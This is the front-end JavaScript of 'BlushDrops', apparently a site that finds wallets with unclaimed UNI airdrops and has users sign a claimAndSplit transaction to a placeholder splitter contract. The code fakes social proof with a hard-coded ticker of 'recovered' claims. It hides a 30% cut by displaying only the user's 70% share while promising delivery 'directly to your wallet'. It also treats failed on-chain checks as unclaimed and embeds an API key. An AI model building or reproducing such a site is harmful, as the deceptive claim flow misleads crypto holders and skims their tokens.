// ============================================================
// BLUSHDROPS — CORE (backend API version)
// ============================================================

const CONFIG = {
  // ⬇️ PASTE YOUR DEPLOYED CONTRACT ADDRESS HERE TOMORROW
  SPLITTER_ADDRESS: "0x0000000000000000000000000000000000000000",

  // Public read-only RPC (Alchemy) for on-chain isClaimed checks
  RPC_URLS: [
    "https://eth-mainnet.g.alchemy.com/v2/AkH_F7btslPyNlLzxXJth",
  ],

  // On-chain airdrop distributor (READ-ONLY isClaimed target)
  UNI_DISTRIBUTOR: "0x090D4613473dEE047c3f2706764f49E0821D256e",

  UNI_DECIMALS: 18,
  UNI_PRICE_USD: 8.5,
  USER_SHARE: 0.70,
};

const SPLITTER_ABI = [
  "function claimAndSplit(uint256 index, address account, uint256 amount, bytes32[] calldata merkleProof) external"
];

const IS_CLAIMED_ABI = [
  "function isClaimed(uint256 index) view returns (bool)"
];

// ---------- STATE ----------
let provider, signer, currentUser;
let readProvider = null;

// ============================================================
// CUSTOM CURSOR
// ============================================================
const cursor = document.getElementById("cursor");
const cursorDot = document.getElementById("cursorDot");
if (cursor && cursorDot) {
  document.addEventListener("mousemove", (e) => {
    cursor.style.left = e.clientX + "px";
    cursor.style.top = e.clientY + "px";
    cursorDot.style.left = e.clientX + "px";
    cursorDot.style.top = e.clientY + "px";
  });
}

// ============================================================
// TICKER
// ============================================================
const tickerPhrases = [
  "0x7a3f…b21 recovered <b>400.20 UNI</b>",
  "0x1b9c…a07 recovered <b>400.00 UNI</b>",
  "0x88d2…ff4 recovered <b>400.00 UNI</b>",
  "0x02a1…e6c recovered <b>401.75 UNI</b>",
  "0xc4b0…19e recovered <b>400.40 UNI</b>",
  "0x3e57…d81 recovered <b>402.00 UNI</b>",
  "0x9fa2…34b recovered <b>400.60 UNI</b>",
  "0x510d…aa9 recovered <b>403.80 UNI</b>",
];
const track = document.getElementById("tickerTrack");
if (track) {
  track.innerHTML = [...tickerPhrases, ...tickerPhrases].map(p => `<span>${p}</span>`).join("");
}

// ============================================================
// READ-ONLY PROVIDER
// ============================================================
function getReadProvider() {
  if (readProvider) return readProvider;

  const providers = CONFIG.RPC_URLS.map((url, i) => ({
    provider: new ethers.providers.JsonRpcProvider(url),
    priority: i + 1,
    stallTimeout: 2500,
    weight: 1,
  }));

  readProvider = new ethers.providers.FallbackProvider(providers, 1);
  return readProvider;
}

// ============================================================
// ON-CHAIN CLAIMED CHECK
// ============================================================
async function checkOnChainClaimed(index) {
  try {
    const p = getReadProvider();
    const distributor = new ethers.Contract(CONFIG.UNI_DISTRIBUTOR, IS_CLAIMED_ABI, p);
    return await distributor.isClaimed(index);
  } catch (e) {
    console.warn("isClaimed check failed, assuming unclaimed:", e);
    return false; // soft fallback
  }
}

// ============================================================
// WALLET DETECTION (EIP-6963 + legacy)
// ============================================================
const detectedWallets = new Map();

window.addEventListener("eip6963:announceProvider", (event) => {
  const { info, provider } = event.detail;
  detectedWallets.set(info.rdns, { info, provider });
  refreshWalletList();
});
window.dispatchEvent(new Event("eip6963:requestProvider"));

function legacyDetect() {
  if (detectedWallets.size > 0) return;
  if (typeof window.ethereum === "undefined") return;

  const providers = window.ethereum.providers || [window.ethereum];
  const seen = new Set();

  providers.forEach((p) => {
    let name = null, rdns = null, icon = null;
    if (p.isBraveWallet)          { name = "Brave Wallet";    rdns = "com.brave.wallet"; }
    else if (p.isRabby)           { name = "Rabby";           rdns = "io.rabby"; }
    else if (p.isMetaMask)        { name = "MetaMask";        rdns = "io.metamask"; }
    else if (p.isCoinbaseWallet)  { name = "Coinbase Wallet"; rdns = "com.coinbase.wallet"; }
    else if (p.isTrust)           { name = "Trust Wallet";    rdns = "com.trustwallet.app"; }
    else if (p.isOKXWallet)       { name = "OKX Wallet";      rdns = "com.okex.wallet"; }
    else if (p.isBitKeep)         { name = "BitKeep";         rdns = "com.bitkeep.wallet"; }
    else if (p.isFrame)           { name = "Frame";           rdns = "sh.frame"; }
    else if (p.isTokenPocket)     { name = "TokenPocket";     rdns = "pro.tokenpocket"; }
    else if (p.isImToken)         { name = "imToken";         rdns = "im.token.app"; }

    if (!name || seen.has(rdns)) return;
    seen.add(rdns);
    detectedWallets.set(rdns, { info: { name, icon, rdns }, provider: p });
  });

  refreshWalletList();
}
setTimeout(legacyDetect, 200);

// ============================================================
// WALLET MODAL
// ============================================================
const walletModal = document.getElementById("walletModal");
const walletList = document.getElementById("walletList");
const walletEmpty = document.getElementById("walletEmpty");
const walletClose = document.getElementById("walletClose");
const walletBackdrop = document.getElementById("walletBackdrop");

function openWalletModal() {
  if (!walletModal) return;
  walletModal.classList.remove("hidden");
  document.body.style.overflow = "hidden";
  refreshWalletList();
}
function closeWalletModal() {
  if (!walletModal) return;
  walletModal.classList.add("hidden");
  document.body.style.overflow = "";
}
if (walletClose) walletClose.addEventListener("click", closeWalletModal);
if (walletBackdrop) walletBackdrop.addEventListener("click", closeWalletModal);
document.addEventListener("keydown", (e) => { if (e.key === "Escape") closeWalletModal(); });

function colorForName(name) {
  const colors = [
    ["#ff8ac1", "#a855f7"], ["#7dd3fc", "#3b82f6"], ["#6ee7b7", "#059669"],
    ["#fbbf24", "#f59e0b"], ["#f472b6", "#db2777"], ["#a78bfa", "#7c3aed"],
  ];
  let hash = 0;
  for (let i = 0; i < name.length; i++) hash = (hash * 31 + name.charCodeAt(i)) | 0;
  return colors[Math.abs(hash) % colors.length];
}

function renderWalletItem(name, icon, rdns, provider) {
  const btn = document.createElement("button");
  btn.className = "wallet-item";
  btn.type = "button";

  const iconHtml = icon
    ? `<img src="${icon}" alt="${name}" />`
    : (() => {
        const [c1, c2] = colorForName(name);
        return `<span class="wallet-letter" style="background:linear-gradient(135deg,${c1},${c2})">${name[0].toUpperCase()}</span>`;
      })();

  btn.innerHTML = `
    <span class="wallet-item-icon">${iconHtml}</span>
    <span class="wallet-item-info">
      <span class="wallet-item-name">${name}</span>
      <span class="wallet-item-tag">Browser extension</span>
    </span>
    <span class="wallet-item-arrow">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>
    </span>`;

  btn.addEventListener("click", () => connectWithProvider(provider));
  return btn;
}

function refreshWalletList() {
  if (!walletList) return;
  walletList.innerHTML = "";
  if (detectedWallets.size === 0) {
    walletList.classList.add("hidden");
    walletEmpty.classList.remove("hidden");
    return;
  }
  walletList.classList.remove("hidden");
  walletEmpty.classList.add("hidden");
  for (const { info, provider } of detectedWallets.values()) {
    walletList.appendChild(renderWalletItem(info.name, info.icon, info.rdns, provider));
  }
}

// ============================================================
// CONNECT
// ============================================================
async function connectWithProvider(providerObj) {
  try {
    if (!providerObj) { alert("Wallet provider not available."); return; }

    provider = new ethers.providers.Web3Provider(providerObj);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    currentUser = await signer.getAddress();

    const btn = document.getElementById("connectBtn");
    btn.classList.add("connected");
    document.getElementById("connectText").textContent =
      currentUser.slice(0, 6) + "…" + currentUser.slice(-4);

    const input = document.getElementById("addressInput");
    if (!input.value.trim()) input.value = currentUser;

    closeWalletModal();

    providerObj.on?.("accountsChanged", (accounts) => {
      if (!accounts || accounts.length === 0) {
        currentUser = null;
        btn.classList.remove("connected");
        document.getElementById("connectText").textContent = "Connect";
      } else {
        currentUser = accounts[0];
        document.getElementById("connectText").textContent =
          currentUser.slice(0, 6) + "…" + currentUser.slice(-4);
      }
    });

    providerObj.on?.("chainChanged", () => window.location.reload());
  } catch (err) {
    console.error(err);
    if (err.code === 4001) return;
    alert("Failed to connect: " + (err.message || "unknown error"));
  }
}

const connectBtn = document.getElementById("connectBtn");
if (connectBtn) {
  connectBtn.addEventListener("click", () => {
    if (currentUser) {
      navigator.clipboard?.writeText(currentUser);
      const t = document.getElementById("connectText");
      const orig = t.textContent;
      t.textContent = "Copied!";
      setTimeout(() => (t.textContent = orig), 1200);
      return;
    }
    openWalletModal();
  });
}

// ============================================================
// LOOKUP — via backend /api/check
// ============================================================
async function lookup(address) {
  const res = await fetch(`/api/check/${address.toLowerCase()}`);
  if (!res.ok) {
    if (res.status === 503) throw new Error("Server is warming up. Try again in 20 seconds.");
    if (res.status === 400) return null;
    throw new Error("Lookup failed: " + res.status);
  }
  const data = await res.json();
  if (!data.eligible) return null;

  const alreadyClaimed = await checkOnChainClaimed(data.index);

  const wei = BigInt(data.amount);
  const totalUni = Number(wei) / 10 ** CONFIG.UNI_DECIMALS;
  const userUni = totalUni * CONFIG.USER_SHARE;

  return {
    index: data.index,
    amountWei: wei.toString(),
    displayUni: userUni,
    displayUsd: userUni * CONFIG.UNI_PRICE_USD,
    claimed: alreadyClaimed,
  };
}

// ============================================================
// CLAIM
// ============================================================
async function claim(data) {
  if (!signer) { openWalletModal(); return; }

  const user = await signer.getAddress();
  const card = document.getElementById("resultCard");

  try {
    pushStatus(card, "info", "Fetching proof…");
    const proofRes = await fetch(`/api/proof/${user.toLowerCase()}`);
    if (!proofRes.ok) throw new Error("Could not fetch proof from server");
    const { proof } = await proofRes.json();

    pushStatus(card, "info", "Preparing transaction…");
    const contract = new ethers.Contract(CONFIG.SPLITTER_ADDRESS, SPLITTER_ABI, signer);
    const tx = await contract.claimAndSplit(data.index, user, data.amountWei, proof);

    pushStatus(card, "info", `Transaction sent (${tx.hash.slice(0,10)}…) — waiting for confirmation…`);
    await tx.wait();
    pushStatus(card, "success", "🎉 Claim successful. Your tokens are in your wallet.");
  } catch (err) {
    console.error(err);
    if (err.code === 4001) pushStatus(card, "error", "Transaction rejected.");
    else pushStatus(card, "error", "Failed: " + (err.reason || err.message || "unknown"));
  }
}

function pushStatus(card, type, text) {
  const el = document.createElement("div");
  el.className = `rc-status ${type}`;
  el.textContent = text;
  card.appendChild(el);
  el.scrollIntoView({ behavior: "smooth", block: "nearest" });
}

// ============================================================
// RENDER RESULT
// ============================================================
function renderResult(address, data) {
  const section = document.getElementById("resultSection");
  const card = document.getElementById("resultCard");
  section.classList.remove("hidden");

  if (!data) {
    card.innerHTML = `
      <div class="rc-empty">
        <span class="rc-emoji">🫥</span>
        <h3 class="rc-title">No unclaimed UNI</h3>
        <p class="rc-sub">This address isn't in the UNI Merkle tree — or it already claimed. More airdrops are being indexed.</p>
      </div>`;
    return;
  }

  if (data.claimed) {
    card.innerHTML = `
      <div class="rc-empty">
        <span class="rc-emoji">✅</span>
        <h3 class="rc-title">Already claimed</h3>
        <p class="rc-sub">This wallet has already received its UNI airdrop. Nothing left to recover.</p>
      </div>`;
    return;
  }

  const uni = data.displayUni;
  const usd = data.displayUsd;

  card.innerHTML = `
    <div class="rc-amount-label">You have unclaimed</div>
    <div class="rc-amount">${uni.toLocaleString(undefined, {maximumFractionDigits: 4})} UNI</div>
    <div class="rc-usd">≈ $${usd.toLocaleString(undefined, {maximumFractionDigits: 2})} USD</div>

    <button id="claimBtn" class="rc-claim">
      <span>Claim ${uni.toFixed(2)} UNI now</span>
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
    </button>
    <p class="rc-note">One signature. Delivered directly to your wallet.</p>
  `;

  document.getElementById("claimBtn").addEventListener("click", () => claim(data));
}

// ============================================================
// EVENTS
// ============================================================
const checkBtn = document.getElementById("checkBtn");
if (checkBtn) {
  checkBtn.addEventListener("click", async () => {
    const input = document.getElementById("addressInput").value.trim();
    if (!/^0x[a-fA-F0-9]{40}$/.test(input)) {
      alert("Enter a valid Ethereum address.");
      return;
    }

    const card = document.getElementById("resultCard");
    const section = document.getElementById("resultSection");
    section.classList.remove("hidden");
    card.innerHTML = `<div class="rc-empty"><div class="spinner"></div><p class="rc-sub" style="margin-top:12px">Scanning the chain…</p></div>`;

    try {
      const data = await lookup(input);
      setTimeout(() => renderResult(input, data), 250);
    } catch (e) {
      card.innerHTML = `<div class="rc-empty"><span class="rc-emoji">⚠️</span><h3 class="rc-title">Scan failed</h3><p class="rc-sub">${e.message}</p></div>`;
    }
  });
}

const addressInput = document.getElementById("addressInput");
if (addressInput) {
  addressInput.addEventListener("keypress", (e) => {
    if (e.key === "Enter") checkBtn.click();
  });
}

// ============================================================
// COUNT-UP ANIMATION
// ============================================================
const countObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const el = entry.target;
      const target = +el.dataset.count;
      let current = 0;
      const step = target / 60;
      const tick = () => {
        current += step;
        if (current >= target) current = target;
        el.textContent = "$" + Math.floor(current).toLocaleString();
        if (current < target) requestAnimationFrame(tick);
      };
      tick();
      countObserver.unobserve(el);
    }
  });
}, { threshold: 0.5 });

document.querySelectorAll("[data-count]").forEach(el => countObserver.observe(el));